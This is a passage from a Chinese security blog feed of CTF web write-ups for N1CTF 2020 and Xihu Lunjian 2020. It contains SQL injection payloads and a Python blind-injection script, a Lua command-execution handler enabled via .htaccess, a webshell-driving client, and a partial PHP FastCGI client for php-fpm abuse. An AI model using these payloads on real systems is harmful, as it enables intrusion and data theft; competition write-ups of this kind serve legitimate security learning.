class="hljs-number">.0</span><span class="hljs-number">.5</span>    <span class="hljs-number">914</span>c062c7588<br><br></code></pre></td></tr></table></figure><p>整理一下所有 ip 的思路（只看后缀）</p><ol><li>setting.py 中有一个 .7 的 ip</li><li>pipelines.py 中有一个 .8 的 ip</li><li>host 中有 .5 的 ip<br>每个 ip 都对应一个 redis，参考这篇文章 <a href="https://blog.csdn.net/zwq912318834/article/details/78854571">https://blog.csdn.net/zwq912318834/article/details/78854571</a> 可知，存在主从 redis。如何判断 主服务器的地址呢？为啥开始 exp 打 .7 的 ip 呢？</li></ol><p>这个题目已经补完了！最重要的思想已经 GET，每次补题都会补题时间过长。。导致很多题目没补完，这次也是。(还有可能是比较菜的原因-。-#)</p><hr><p>官方已经将环境关闭了，额，补不完了。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2020年10月N1CTF部分web题解</title>
    <link href="/2020/10/17/20201017-N1CTF/"/>
    <url>/2020/10/17/20201017-N1CTF/</url>
    
    <content type="html"><![CDATA[<p>题解地址：<a href="https://github.com/Nu1LCTF/n1ctf-2020">https://github.com/Nu1LCTF/n1ctf-2020</a><br>国内比较好的比赛，将题目都放出来了，正好可以抽时间把「西湖论剑」的题目好好补补。</p><hr><a id="more"></a><h1 id="Web-SignIn（SQL盲注-报错注入-布尔注入）"><a href="#Web-SignIn（SQL盲注-报错注入-布尔注入）" class="headerlink" title="Web-SignIn（SQL盲注+报错注入+布尔注入）"></a>Web-SignIn（SQL盲注+报错注入+布尔注入）</h1><p>思路历程大致是这样的，比赛后没环境（</p><ul><li>理解反序列化执行流程。</li><li>反序列化执行 toString 函数。（绕过 wakeup，利用 destuct 的 echo 函数）<ul><li>安装 php5.5</li><li>本地绕过</li><li>云端绕过（没有回显）</li></ul></li><li>利用 stristr 函数调用 toString 函数。<ul><li>时间盲注（时间函数被 WAF 了）</li><li>SQL注入之基于运行错误的Boolean注入<ul><li>语法错误和正常执行 noip</li><li>特殊错误 welcome（含数据库名或后面的函数报错）<ul><li>‘+(select updatexml(1,concat(0x7e,(select database()),0x7e),1))+’</li><li>‘+(select _(1))+’<br>MySQL</li><li>exp(~(select * from (select n1ctf_websign())a))</li></ul></li></ul></li></ul></li><li>构造 XFF 进行 SQL 注入。</li><li>编写 exp 进行报错<br>payload：’+(select (database()&gt;1) and exp(~(select * from (select user())n1ctf_websign)))+’<br>利用 and 的特性进行判断。</li><li>最后从 n1key 中读出 flag。<ul><li>注意字段为 key 时需要使用别名。（与MySQL字段冲突）</li></ul></li></ul><p>反序列化：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><br><span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:4</span><span class="hljs-selector-pseudo">:&quot;flag&quot;</span><span class="hljs-selector-pseudo">:2</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;ip&quot;</span>;<span class="hljs-attribute">O</span>:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;ip&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;ip&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;127.0.0.1&quot;</span>;&#125;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:5</span><span class="hljs-selector-pseudo">:&quot;check&quot;</span>;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:6</span><span class="hljs-selector-pseudo">:&quot;thrmen&quot;</span>;&#125;<br><br></code></pre></td></tr></table></figure><p>时间盲注 SQL 语句：<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/55A7478F-5E91-4039-99E6-05DE0ED86183.png"></p><p>被 ban 的函数：<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/D65E9F75-E63F-46BE-9B5A-120238A16663.png"></p><p>用到的SQL语句:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><br># 查询数据库名字<br># <span class="hljs-keyword">database</span>()<br><br># 查询数据库信息<br># <span class="hljs-keyword">SELECT</span> concat(version(),<span class="hljs-number">0x3a</span>,<span class="hljs-keyword">user</span>(),<span class="hljs-number">0x3a</span>,<span class="hljs-keyword">database</span>(),<span class="hljs-number">0x3a</span>,@@datadir,<span class="hljs-number">0x3a</span>,@@version_compile_os)<br><br># 查询文件读取权限<br># <span class="hljs-keyword">select</span> group_concat(<span class="hljs-keyword">user</span>,<span class="hljs-number">0x3a</span>,file_priv) <span class="hljs-keyword">from</span> mysql.<span class="hljs-keyword">user</span><br><br># 查询当前用户<br># <span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()<br><br># 查询数据库版本<br># version()<br><br># 查询表名的长度<br>#  (<span class="hljs-keyword">select</span> length(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;n1ctf_websign&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span><br><br># 查询表名（修改后面的 <span class="hljs-keyword">limit</span>）<br># <span class="hljs-keyword">select</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">DATABASE</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span><br><br># 判断字段名（修改后面的 <span class="hljs-keyword">limit</span>）<br># <span class="hljs-keyword">select</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;n1key&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>。<br><br># 查询 ip 表。（边插入边查询，需要使用别名）<br># <span class="hljs-keyword">SELECT</span> tid <span class="hljs-keyword">FROM</span> (<span class="hljs-keyword">select</span> ip tid <span class="hljs-keyword">from</span> n1ip <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>) <span class="hljs-keyword">AS</span> tt<br><br># 查询某个字段的数据（key 与数据库的关键词相冲突，需要使用别名）<br># <span class="hljs-keyword">select</span> GROUP_CONCAT(id) <span class="hljs-keyword">FROM</span> n1key<br># <span class="hljs-keyword">select</span> group_concat(bb.key) <span class="hljs-keyword">from</span> n1key bb<br># <span class="hljs-keyword">select</span> group_concat(key) <span class="hljs-keyword">FROM</span> (<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> n1key) <span class="hljs-keyword">as</span> a<br># <span class="hljs-keyword">select</span> id <span class="hljs-keyword">from</span> n1key <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br># 不使用字段名度值<br># <span class="hljs-keyword">SELECT</span> a<span class="hljs-number">.2</span> <span class="hljs-keyword">FROM</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>, <span class="hljs-number">2</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> n1key<br><br># 判断是否有数据<br># <span class="hljs-keyword">SELECT</span> (<span class="hljs-keyword">SELECT</span> key <span class="hljs-keyword">FROM</span> n1key) <span class="hljs-keyword">IS</span> <span class="hljs-keyword">NULL</span><br><br># 查询文件<br># <span class="hljs-keyword">SELECT</span> LOAD_FILE(<span class="hljs-string">&#x27;/flag&#x27;</span><br><br></code></pre></td></tr></table></figure><p>爆破使用的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">import</span> string<br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><br>url = <span class="hljs-string">&#x27;http://101.32.205.189/?input=O:4:%22flag%22:2:&#123;s:2:%22ip%22;O:2:%22ip%22:0:&#123;&#125;s:5:%22check%22;N;&#125;&#x27;</span><br><br>session = requests.Session()<br><br><br><span class="hljs-comment"># 生成库名表名字符所在的字符列表字典</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ascii_str</span>():</span><br>    str_list = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">33</span>, <span class="hljs-number">127</span>):  <span class="hljs-comment"># 所有可显示字符</span><br>        str_list.append(chr(i))<br>    <span class="hljs-comment"># print(&#x27;可显示字符：%s&#x27;%str_list)</span><br>    <span class="hljs-comment"># # 返回字符列表</span><br>    <span class="hljs-keyword">return</span> str_list<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">query</span>(<span class="hljs-params">sql</span>):</span><br>    payload = <span class="hljs-string">&quot;1&#x27;+(select (&quot;</span> + sql + <span class="hljs-string">&quot;) and exp(~(select * from (select user())n1ctf_websign)))+&#x27;&quot;</span><br>    print(payload)<br>    resp = session.get(<br>        url=url,<br>        headers=&#123;<span class="hljs-string">&quot;x-forwarded-for&quot;</span>: payload&#125;<br>    )<br>    soup = BeautifulSoup(markup=resp.text, features=<span class="hljs-string">&#x27;lxml&#x27;</span>)<br><br>    <span class="hljs-comment"># 提取判读 True 和 False 的依据</span><br>    result = soup.find_all(name=<span class="hljs-string">&#x27;code&#x27;</span>)[<span class="hljs-number">1</span>]<br>    <span class="hljs-comment"># print(result)</span><br><br>    <span class="hljs-comment"># 执行成功返回 True</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;n1ctf2020&quot;</span> <span class="hljs-keyword">in</span> result.text:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-comment"># 用于测试函数是否正常执行（使用 while 不方便）</span><br><span class="hljs-comment"># param = f&quot;substr(database(), 1, 1)=&#x27;n&#x27;&quot;</span><br><span class="hljs-comment"># result = query(param)</span><br><span class="hljs-comment"># print(result)</span><br><br><span class="hljs-comment"># 不同的字典</span><br>CHAR_DICTIONARY1 = list(string.ascii_lowercase + string.ascii_uppercase + string.digits) + [<span class="hljs-string">&#x27;\\_&#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-string">&#x27;&#123;&#x27;</span>, <span class="hljs-string">&#x27;&#125;&#x27;</span>]<br>CHAR_DICTIONARY2 = ascii_str()<br><br><span class="hljs-comment"># find 用于存储已找到的字符</span><br>find = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-comment"># 使用 ascii 作用判断依据更好。</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    f = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> range(<span class="hljs-number">30</span>, <span class="hljs-number">127</span>):<br>        pos = len(find) + <span class="hljs-number">1</span><br>        s = <span class="hljs-string">&#x27;select table_name from information_schema.tables where table_schema=DATABASE() limit 1,1&#x27;</span><br>        <span class="hljs-comment"># 使用 ascii 码进行判断（更优）</span><br>        param = <span class="hljs-string">f&quot;ascii(substr((<span class="hljs-subst">&#123;s&#125;</span>), <span class="hljs-subst">&#123;pos&#125;</span>, 1))=&#x27;<span class="hljs-subst">&#123;c&#125;</span>&#x27;&quot;</span><br>        <span class="hljs-comment"># 使用 char 进行字符判断。</span><br>        <span class="hljs-comment"># param = f&quot;substr((&#123;s&#125;), &#123;pos&#125;, 1)=&#x27;&#123;c&#125;&#x27;&quot;</span><br>        result = query(param)<br>        <span class="hljs-keyword">if</span> result:<br>            f = <span class="hljs-literal">True</span><br>            find += chr(c)<br>            print(find)<br>            print(<span class="hljs-string">&#x27;-------------------------&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> f:<br>        <span class="hljs-keyword">break</span><br>print(find)<br><br></code></pre></td></tr></table></figure><p>参考教程：</p><ol><li>你真的了解 IP 吗，PHP 如何严格获取真实用户 IP？：<a href="https://learnku.com/laravel/t/3905/do-you-really-know-ip-how-do-php-get-the-real-user-ip">https://learnku.com/laravel/t/3905/do-you-really-know-ip-how-do-php-get-the-real-user-ip</a></li><li>Bugku INSERT INTO注入(时间盲注）：<a href="https://blog.csdn.net/qq_37873738/article/details/85633897">https://blog.csdn.net/qq_37873738/article/details/85633897</a></li></ol><hr><p>后面的题目以后有时间补补（占坑</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2020年10月西湖论剑CTF部分web题解</title>
    <link href="/2020/10/14/20201014-%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/"/>
    <url>/2020/10/14/20201014-%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/</url>
    
    <content type="html"><![CDATA[<p>题目质量很高。</p><hr><a id="more"></a><h1 id="NewUpload（php-fpm任意代码执行）"><a href="#NewUpload（php-fpm任意代码执行）" class="headerlink" title="NewUpload（php-fpm任意代码执行）"></a>NewUpload（php-fpm任意代码执行）</h1><ul><li>使用 Burpsuite 进行文件上传一句话，文件名使用换行绕过，上传内容 %00 截断绕过，post 内容使用 base64 加密，不然会被拦截。</li><li>查看 phpinfo 拿到题目较为明显的2个条件：<ol><li>disable_function，过滤了如下函数</li><li>open_basedir限制了如下目录</li></ol></li><li>读取根目录 var_dump(scandir(“/“));发现 flag 文件和 readflag 文件。</li><li>open_basedir 绕过尝试读取 2 个文件，查看flag文件（没有权限）、readflag文件（二进制文件）。</li><li>使用蚁剑连接，方便后面进行利用。</li></ul><p><strong>解法1:宝塔 Apache 默认安装的 lua 模块配合 htaccess 执行系统命令</strong></p><ul><li>编写并上传 .htaccess 文件</li><li>写一个 1.lua 进行命令执行即可拿到 flag{3be9f1618515e751892cef4cf16f820e}</li></ul><p><strong>.htaccess 文件</strong></p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">AddHandler </span>lua-<span class="hljs-keyword">script </span>.lua<br></code></pre></td></tr></table></figure><p><strong>1.lua</strong></p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-built_in">require</span> <span class="hljs-string">&quot;string&quot;</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">handle</span><span class="hljs-params">(r)</span></span><br>    r.content_type = <span class="hljs-string">&quot;text/plain&quot;</span><br>    <span class="hljs-keyword">local</span> t = <span class="hljs-built_in">io</span>.<span class="hljs-built_in">popen</span>(<span class="hljs-string">&#x27;/readflag&#x27;</span>)<br>    <span class="hljs-keyword">local</span> a = t:<span class="hljs-built_in">read</span>(<span class="hljs-string">&quot;*all&quot;</span>)<br>    r:puts(a)<br><br><br>    <span class="hljs-keyword">if</span> r.method == <span class="hljs-string">&#x27;GET&#x27;</span> <span class="hljs-keyword">then</span><br>        <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> <span class="hljs-built_in">pairs</span>( r:parseargs() ) <span class="hljs-keyword">do</span><br>            r:puts( <span class="hljs-built_in">string</span>.<span class="hljs-built_in">format</span>(<span class="hljs-string">&quot;%s: %s\n&quot;</span>, k, v) )<br>        <span class="hljs-keyword">end</span><br>    <span class="hljs-keyword">else</span><br>        r:puts(<span class="hljs-string">&quot;Unsupported HTTP method &quot;</span> .. r.method)<br>    <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p><strong>解法3：利用tmp下的php-fpm socket加载扩展（利用蚁剑插件）</strong></p><ul><li>编译并上传 ant.so。</li><li>上传蚁剑的加载拓展脚本 2.php</li><li>上传 s.php 执行函数</li><li>访问 s.php 得到 flag。 </li></ul><p><strong>方便执行代码（自己base64）</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><br><br>session = requests.Session()<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    url = <span class="hljs-string">&quot;http://newupload.xhlj.wetolink.com/sandbox/i631kn4rq3skctfkab4d65uhuc/upload/5.php&quot;</span><br>    resp = session.post(<br>        url=url,<br>        data=&#123;<br>            <span class="hljs-string">&#x27;pass&#x27;</span>: input()<br>        &#125;<br>    )<br>    print(resp.text)<br>    print(<span class="hljs-string">&#x27;------------------------------------&#x27;</span>)<br></code></pre></td></tr></table></figure><p><strong>2.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Client</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">const</span> VERSION_1            = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">const</span> BEGIN_REQUEST        = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">const</span> PARAMS               = <span class="hljs-number">4</span>;<br>    <span class="hljs-keyword">const</span> STDIN                = <span class="hljs-number">5</span>;<br>    <span class="hljs-keyword">const</span> STDOUT               = <span class="hljs-number">6</span>;<br>    <span class="hljs-keyword">const</span> STDERR               = <span class="hljs-number">7</span>;<br>    <span class="hljs-keyword">const</span> DATA                 = <span class="hljs-number">8</span>;<br>    <span class="hljs-keyword">const</span> GET_VALUES           = <span class="hljs-number">9</span>;<br>    <span class="hljs-keyword">const</span> GET_VALUES_RESULT    = <span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">const</span> UNKNOWN_TYPE         = <span class="hljs-number">11</span>;<br>    <span class="hljs-keyword">const</span> RESPONDER            = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">protected</span> $keepAlive = <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">protected</span> $_requests = <span class="hljs-keyword">array</span>();<br>    <span class="hljs-keyword">protected</span> $_requestCounter = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">buildPacket</span>(<span class="hljs-params">$type, $content, $requestId = <span class="hljs-number">1</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        $offset = <span class="hljs-number">0</span>;<br>        $totLen = strlen($content);<br>        $buf    = <span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-comment">// Packets can be a maximum of 65535 bytes</span><br>            $part = substr($content, $offset, <span class="hljs-number">0xffff</span> - <span class="hljs-number">8</span>);<br>            $segLen = strlen($part);<br>            $buf .= chr(<span class="hljs-built_in">self</span>::VERSION_1)        <span class="hljs-comment">/* version */</span><br>                . chr($type)                    <span class="hljs-comment">/* type */</span><br>                . chr(($requestId &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) <span class="hljs-comment">/* requestIdB1 */</span><br>                . chr($requestId &amp; <span class="hljs-number">0xFF</span>)        <span class="hljs-comment">/* requestIdB0 */</span><br>                . chr(($segLen &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>)    <span class="hljs-comment">/* contentLengthB1 */</span><br>                . chr($segLen &amp; <span class="hljs-number">0xFF</span>)           <span class="hljs-comment">/* contentLengthB0 */</span><br>                . chr(<span class="hljs-number">0</span>)                        <span class="hljs-comment">/* paddingLength */</span><br>                . chr(<span class="hljs-number">0</span>)                        <span class="hljs-comment">/* reserved */</span><br>                . $part;                        <span class="hljs-comment">/* content */</span><br>            $offset += $segLen;<br>        &#125; <span class="hljs-keyword">while</span> ($offset &lt; $totLen);<br>        <span class="hljs-keyword">return</span> $buf;<br>    &#125;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">buildNvpair</span>(<span class="hljs-params">$name, $value</span>)</span><br><span class="hljs-function">    </span>&#123;<br>        $nlen = strlen($name);<br>        $vlen = strlen($value);<br>        <span class="hljs-keyword">if</span> ($nlen &lt; <span class="hljs-number">128</span>) &#123;<br>            <span class="hljs-comment">/* nameLengthB0 */</span><br>            $nvpair = chr($nlen);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">/* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */</span><br>            $nvpair = chr(($nlen &gt;&gt; <span class="hljs-number">24</span>) | <span class="hljs-number">0x80</span>) . chr(($nlen &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>) . chr(($nlen &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) . chr($nlen &amp; <span class="hljs-number">0xFF</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> ($vlen &lt; <span class="hljs-number">128</span>) &#123;<br>            <span class="hljs-comment">/* valueLengthB0 */</span><br>            $nvpair .= chr($vlen);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">/* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */</span><br>            $nvpair .= chr(($vlen &gt;&gt; <span class="hljs-number">24</span>) | <span class="hljs-number">0x80</span>) . chr(($vlen &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>) . chr(($vlen &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) . chr($vlen &amp; <span class="hljs-number">0xFF</span>);<br>        &#125;<br>        <span class="hljs-comment">/* nameData &amp; valueData */</span><br>        <span class="hljs-keyword">return</span> $nvpair . $name . $value;<br>    &#125;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readNvpair</span>(<span class="hljs-params">$data, $length = <span class="hljs-literal">null</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> ($length === <span class="hljs-literal">null</span>) &#123;<br>            $length = strlen($data);<br>        &#125;<br>        $array = <span class="hljs-keyword">array</span>();<br>        $p = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> ($p != $length) &#123;<br>            $nlen = ord($data&#123;$p++&#125;);<br>            <span class="hljs-keyword">if</span> ($nlen &gt;= <span class="hljs-number">128</span>) &#123;<br>                $nlen = ($nlen &amp; <span class="hljs-number">0x7F</span> &lt;&lt; <span class="hljs-number">24</span>);<br>                $nlen |= (ord($data&#123;$p++&#125;) &lt;&lt; <span class="hljs-number">16</span>);<br>                $nlen |= (ord($data&#123;$p++&#125;) &lt;&lt; <span class="hljs-number">8</span>);<br>                $nlen |= (ord($data&#123;$p++&#125;));<br>            &#125;<br>            $vlen = ord($data&#123;$p++&#125;);<br>            <span class="hljs-keyword">if</span> ($vlen &gt;= <span class="hljs-number">128</span>) &#123;<br>                $vlen = ($nlen &amp; <span class="hljs-number">0x7F</span> &lt;&lt; <span class="hljs-number">24</span>);<br>                $vlen |= (ord($data&#123;$p++&#125;) &lt;&lt; <span class="hljs-number">16</span>);<br>                $vlen |= (ord($data&#123;$p++&#125;) &lt;&lt; <span class="hljs-number">8</span>);<br>                $vlen |= 